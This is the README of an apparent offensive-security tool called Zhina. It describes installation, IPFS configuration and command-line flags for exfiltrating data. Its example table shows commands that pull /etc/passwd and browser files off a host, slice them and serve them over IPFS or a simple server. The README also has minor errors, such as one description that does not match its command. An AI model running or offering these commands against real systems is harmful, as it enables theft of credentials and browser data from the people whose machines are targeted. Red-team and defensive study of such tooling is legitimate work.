### Zhina



A simple app to exfiltration data with some features.

## Overview

A tools for exfiltration with mutliple way.

Brought to you by:

<img src="https://hadess.io/wp-content/uploads/2022/04/LOGOTYPE-tag-white-.png" alt="HADESS" width="200"/>

[HADESS](https://hadess.io) performs offensive cybersecurity services through infrastructures and software that include vulnerability analysis, scenario attack planning, and implementation of custom integrated preventive projects. We organized our activities around the prevention of corporate, industrial, and laboratory cyber threats.



## Background

![zhina](zhina.png)


On 16 September 2022, a 22-year-old kurdish women with iranian nationality named Mahsa Amini[a], also known as Jina Amini, died in a hospital in Tehran, Iran, under suspicious circumstances. The Guidance Patrol, the religious morality police of Iran's government, arrested Amini for not wearing the hijab in accordance with government standards.

## Installation

You can install a few ways:

1. Download the binary for your OS from https://github.com/HadessCS/zhina/releases
1. or use `go install`
   ```
   go install -v github.com/hadesscs/zhina
   ```
1. or clone the git repo and build
   ```
   git clone https://github.com/hadesscs/zhina.git
   cd zhina
   go get -v
   go build
   ```


## Configuration

Create a configuration file called `config.yaml` an example is available below:
```
---
infura:
  PROJECT_ID: [PROJECT_ID]
  API_SECRET_KEY: [API_SECRET_KEY]
```


When zhina runs it checks the current directory for a `config.yaml`, if you wish to use a different configuration file use the command `--config /path/to/file.yaml`


## Command Line Options
```
--all             For all devices
--config string   Configuration file: /path/to/file.yaml, default = ./config.yaml (default "config.yaml")
--debug           Display debugging information
--device string   What device to query, (default: "all")
--displayconfig   Display configuration
--do string       encode64
--path string     Path to Exfiltrate
--serve type           How Exfiltrate
--version         Display version information
--help            Display help
```




##  Example Usage
| Command | Details |
|:--|:--|
| `zhina --do encode64 --path /etc/passwd` | Exfiltrate password file |
| `zhina --path browser --slice slice1M --serve ipfs` | Exfiltrate Browser Files with 1M slice and serve on ipfs |
| `zhina --path /etc/passwd --slice slice1M --serve simple` | Exfiltrate Browser Files with 1M slice and serve on simple |




